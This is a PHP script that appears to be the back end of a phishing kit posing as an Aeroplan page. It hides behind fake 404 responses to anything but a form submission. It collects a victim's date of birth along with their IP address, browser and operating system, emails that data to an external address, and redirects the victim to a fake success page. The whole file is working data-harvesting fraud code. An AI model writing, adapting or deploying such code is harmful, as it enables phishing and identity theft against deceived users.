<?php


if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}

if (empty($_POST['dfield']) || empty($_POST['mfield']) || empty($_POST['yfield'])) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}

$dfield = htmlspecialchars(trim($_POST['dfield']), ENT_QUOTES, 'UTF-8');
$mfield = htmlspecialchars(trim($_POST['mfield']), ENT_QUOTES, 'UTF-8');
$yfield = htmlspecialchars(trim($_POST['yfield']), ENT_QUOTES, 'UTF-8');

if (!ctype_digit($dfield) || !ctype_digit($mfield) || !ctype_digit($yfield)) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}

if (!checkdate((int)$mfield, (int)$dfield, (int)$yfield)) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
}


$ip = getenv("REMOTE_ADDR");
$dfield=$_POST['dfield'];
$mfield=$_POST['mfield'];
$yfield=$_POST['yfield'];


$browser = $_SERVER['HTTP_USER_AGENT'];


$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

     $os_array = array(

        '/windows nt 11/i'      =>  'Windows 11',
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/macintosh|mac os x|mac_powerpc/i' => 'macOS',
        '/ubuntu/i'             =>  'Ubuntu',
        '/fedora/i'             =>  'Fedora',
        '/debian/i'             =>  'Debian',
        '/linux/i'              =>  'Linux',
        '/cros/i'               =>  'ChromeOS',
        '/ipad/i'               =>  'iPadOS',
        '/iphone/i'             =>  'iOS',
        '/ipod/i'               =>  'iOS',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array = array(
        '/duckduckgo/i'   =>  'DuckDuckGo',
        '/brave/i'        =>  'Brave',
        '/vivaldi/i'      =>  'Vivaldi',
        '/edg/i'          =>  'Edge Chromium Edge',
        '/msie/i'         =>  'Internet Explorer',
        '/trident/i'      =>  'Internet Explorer For IE 11',
        '/firefox/i'      =>  'Firefox',
        '/fxios/i'        =>  'Firefox on iOS',
        '/opr/i'          =>  'Opera',
        '/opera/i'        =>  'Opera',
        '/chrome/i'       =>  'Chrome',
        '/safari/i'       =>  'Safari',
        '/konqueror/i'    =>  'Konqueror',
        '/mobile/i'       =>  'Mobile Browser'
    );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();


$subj = "| Air - $ip | D.M.Y. $dfield $mfield $yfield |";
$msg = "************\t\n DD.MM.YYYY: $dfield $mfield $yfield\t\n ************\t\n User-Agent: $browser\t\n Browser: $user_browser\t\n OS: $user_os\t\n IP: $ip\t\n ************\t\n";
$from = " ";

mail("info@thecleaner.org.uk", $subj, $msg, $from); 



echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1250"><meta http-equiv="refresh" content="0; url=../successfully/successfully.html"><title>Aeroplan</title></head><body></div></body></html>';

?>